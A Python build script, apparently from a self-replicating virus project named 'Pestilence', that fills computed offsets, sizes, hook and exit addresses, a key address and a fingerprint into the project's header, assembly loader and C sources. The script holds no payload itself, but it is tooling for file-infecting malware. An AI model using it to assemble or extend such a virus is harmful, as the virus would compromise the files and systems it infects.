from get_vals import \
	memcpy_addr, bis_size, loader_size, main_end, main_start, offset_1, offset_2, offset_3, offset_4, offset_5, offset_6, in_pestilence, in_pestilence2, offset_rip, call_1, call_2, call_3, call_4, call_5, hook_1, hook_2, hook_3, hook_4, hook_5, \
	full_size, payload_size, \
	exit_1, exit_2, exit_3, exit_4, exit_5, end_ft_end, bis_end, jmpr15, key_addr, offset_pos_rdi, offset_key_loader, pos_neg_bis, addr_index, fingerprint_bis

def open_file(name):
	f = open(name, "r")
	content = f.readlines()
	f.close()
	f = open(name, "w")
	return f, content

f, content = open_file("includes/pestilence.h")
for i in range(0, len(content)):
    if content[i].find("FT_MEMCPY_ADDR") == 9:
        content[i] = content[i][0:24] + memcpy_addr + content[i][30:-1] + "\n"
    if content[i].find("BIS_SIZE") == 9:
    	content[i] = content[i][0:18] + bis_size + content[i][23:-1] + "\n"
    if content[i].find("LOADER_SIZE") == 9:
    	content[i] = content[i][0:21] + loader_size + content[i][25:-1] + "\n"
    if content[i].find("PAYLOAD_SIZE") != -1: 
    	content[i] = content[i][0:22] + main_end + content[i][28:-1] + "\n"
    if content[i].find("MAIN_OFFSET") != -1: 
    	content[i] = content[i][0:21] + main_start + content[i][27:-1] + "\n"
    if content[i].find("OFFSET_1") != -1: 
    	content[i] = content[i][0:18] + offset_1 + content[i][24:-1] + "\n"
    if content[i].find("OFFSET_2") != -1: 
    	content[i] = content[i][0:18] + offset_2 + content[i][24:-1] + "\n"
    if content[i].find("OFFSET_3") != -1: 
    	content[i] = content[i][0:18] + offset_3 + content[i][24:-1] + "\n"
    if content[i].find("OFFSET_4") != -1: 
    	content[i] = content[i][0:18] + offset_4 + content[i][24:-1] + "\n"
    if content[i].find("OFFSET_5") != -1: 
    	content[i] = content[i][0:18] + offset_5 + content[i][24:-1] + "\n"
    if content[i].find("OFFSET_6") != -1: 
    	content[i] = content[i][0:18] + offset_6 + content[i][24:-1] + "\n"
    if content[i].find("OFFSET_7") != -1: 
    	content[i] = content[i][0:18] + in_pestilence + content[i][24:-1] + "\n"
    if content[i].find("OFFSET_8") != -1: 
    	content[i] = content[i][0:18] + in_pestilence2 + content[i][24:-1] + "\n"
    if content[i].find("OFFSET_RIP") != -1:
    	content[i] = content[i][0:20] + offset_rip + content[i][26:-1] + "\n"
    if content[i].find("OFFSET_CALL_1") != -1:
    	content[i] = content[i][0:23] + call_1 + content[i][29:-1] + "\n"
    if content[i].find("OFFSET_CALL_2") != -1:
    	content[i] = content[i][0:23] + call_2 + content[i][29:-1] + "\n"
    if content[i].find("OFFSET_CALL_3") != -1:
    	content[i] = content[i][0:23] + call_3 + content[i][29:-1] + "\n"
    if content[i].find("OFFSET_CALL_4") != -1:
    	content[i] = content[i][0:23] + call_4 + content[i][29:-1] + "\n"
    if content[i].find("OFFSET_CALL_5") != -1:
    	content[i] = content[i][0:23] + call_5 + content[i][29:-1] + "\n"
    if content[i].find("OFFSET_HOOK_1") != -1:
    	content[i] = content[i][0:23] + hook_1 + content[i][29:-1] + "\n"
    if content[i].find("OFFSET_HOOK_2") != -1:
    	content[i] = content[i][0:23] + hook_2 + content[i][29:-1] + "\n"
    if content[i].find("OFFSET_HOOK_3") != -1:
    	content[i] = content[i][0:23] + hook_3 + content[i][29:-1] + "\n"
    if content[i].find("OFFSET_HOOK_4") != -1:
    	content[i] = content[i][0:23] + hook_4 + content[i][29:-1] + "\n"
    if content[i].find("OFFSET_HOOK_5") != -1:
    	content[i] = content[i][0:23] + hook_5 + content[i][29:-1] + "\n"

    f.write(content[i])
f.close()


f, content = open_file("srcs_s/loader.s")
for i in range(0, len(content)):
    if content[i].find("|REPLACE1|") != -1:
        place = content[i].find("|REPLACE1|") - 7
        content[i] = content[i][0:place] + hex(int(full_size, 16) + 0x1000) + content[i][place + 6:]
    if content[i].find("|REPLACE2|") != -1:
        place = content[i].find("|REPLACE2|") - 6
        content[i] = content[i][0:place] + hex(int(bis_size, 16)) + content[i][place + 5:]
    if content[i].find("|REPLACE3|") != -1:
        place = content[i].find("|REPLACE3|") - 5
        content[i] = content[i][0:place] + offset_key_loader + content[i][place + 4:]
    if content[i].find("|REPLACE4|") != -1:
        place = content[i].find("|REPLACE4|") - 5
        content[i] = content[i][0:place] + hex(int(offset_key_loader, 16) + 4) + content[i][place + 4:]
    f.write(content[i])
f.close()


f, content = open_file("srcs_s/bis.s")
for i in range(0, len(content)):
    if content[i].find("|REPLACE2|") != -1:
    	place = content[i].find("|REPLACE2|") - 7
    	content[i] = content[i][0:place] + payload_size + content[i][place + 6:]
    if content[i].find("|REPLACE3|") != -1:
    	place = content[i].find("|REPLACE3|") - 5
    	content[i] = content[i][0:place] + key_addr + content[i][place + 4:]
    if content[i].find("|REPLACE4|") != -1:
    	place = content[i].find("|REPLACE4|") - 5
    	content[i] = content[i][0:place] + hex(int(key_addr, 16) + 4) + content[i][place + 4:]
    f.write(content[i])
f.close()


f, content = open_file("srcs_c/crypto.c")
for i in range(0, len(content)):
    if content[i].find("/*D*/") != -1:
    	place = content[i].find("/*D*/") + 5
    	content[i] = content[i][0:place] + fingerprint_bis + content[i][content[i].find("/*D`*/"):]
    if content[i].find("/*C*/") != -1:
    	place = content[i].find("/*C*/") + 5
    	content[i] = content[i][0:place] + key_addr + content[i][content[i].find("/*C`*/"):]
    if content[i].find("/*B*/") != -1:
    	place = content[i].find("/*B*/") + 5
    	content[i] = content[i][0:place] + jmpr15 + content[i][content[i].find("/*B`*/"):]
    if content[i].find("/*G*/") != -1:
    	place = content[i].find("/*G*/") + 5
    	content[i] = content[i][0:place] + offset_key_loader + content[i][content[i].find("/*G`*/"):]
    if content[i].find("/*G2*/") != -1:
    	place = content[i].find("/*G2*/") + 6
    	content[i] = content[i][0:place] + hex(int(offset_key_loader, 16) + 4) + content[i][content[i].find("/*G2`*/"):]
    if content[i].find("/*H*/") != -1:
    	place = content[i].find("/*H*/") + 5
    	content[i] = content[i][0:place] + key_addr + content[i][content[i].find("/*H`*/"):]
    if content[i].find("/*H2*/") != -1:
    	place = content[i].find("/*H2*/") + 6
    	content[i] = content[i][0:place] + hex(int(key_addr, 16) + 4) + content[i][content[i].find("/*H2`*/"):]
    f.write(content[i])
f.close()


f, content = open_file("srcs_c/check_ownfile.c")
for i in range(0, len(content)):
    if content[i].find("/*I*/") != -1:
    	place = content[i].find("/*I*/") + 5
    	content[i] = content[i][0:place] + pos_neg_bis + content[i][content[i].find("/*I`*/"):]
    if content[i].find("/*J*/") != -1:
    	place = content[i].find("/*J*/") + 5
    	content[i] = content[i][0:place] + addr_index + content[i][content[i].find("/*J`*/"):]
    f.write(content[i])
f.close()


f, content = open_file("srcs_c/patch.c")
for i in range(0, len(content)):
    if content[i].find("//REPLACE1") != -1:
    	place = content[i].find("-=") + 3
    	content[i] = content[i][0:place] + hex(bis_end - exit_1) + content[i][content[i].find(";//"):]
    if content[i].find("//REPLACE2") != -1:
    	place = content[i].find("-=") + 3
    	content[i] = content[i][0:place] + hex(bis_end - exit_2) + content[i][content[i].find(";//"):]
    if content[i].find("//REPLACE3") != -1:
    	place = content[i].find("-=") + 3
    	content[i] = content[i][0:place] + hex(bis_end - exit_3) + content[i][content[i].find(";//"):]
    if content[i].find("//REPLACE4") != -1:
    	place = content[i].find("-=") + 3
    	content[i] = content[i][0:place] + hex(bis_end - exit_4) + content[i][content[i].find(";//"):]
    if content[i].find("//REPLACE5") != -1:
    	place = content[i].find("-=") + 3
    	content[i] = content[i][0:place] + hex(bis_end - exit_5) + content[i][content[i].find(";//"):]

    if content[i].find("/*REPLACE1*/") != -1:
    	place = content[i].find("0x")
    	content[i] = content[i][0:place] + hex(bis_end - exit_1) + content[i][content[i].find("/*"):]
    if content[i].find("/*REPLACE2*/") != -1:
    	place = content[i].find("0x")
    	content[i] = content[i][0:place] + hex(bis_end - exit_2) + content[i][content[i].find("/*"):]
    if content[i].find("/*REPLACE3*/") != -1:
    	place = content[i].find("0x")
    	content[i] = content[i][0:place] + hex(bis_end - exit_3) + content[i][content[i].find("/*"):]
    if content[i].find("/*REPLACE4*/") != -1:
    	place = content[i].find("0x")
    	content[i] = content[i][0:place] + hex(bis_end - exit_4) + content[i][content[i].find("/*"):]
    if content[i].find("/*REPLACE5*/") != -1:
    	place = content[i].find("0x")
    	content[i] = content[i][0:place] + hex(bis_end - exit_5) + content[i][content[i].find("/*"):]

    if content[i].find("/*A*/") != -1:
    	place = content[i].find("/*A*/") + 5
    	content[i] = content[i][0:place] + end_ft_end + content[i][content[i].find("/*A`*/"):]
    if content[i].find("/*E*/") != -1:
    	place = content[i].find("/*E*/") + 5
    	content[i] = content[i][0:place] + offset_pos_rdi + content[i][content[i].find("/*E`*/"):]


    f.write(content[i])
f.close()

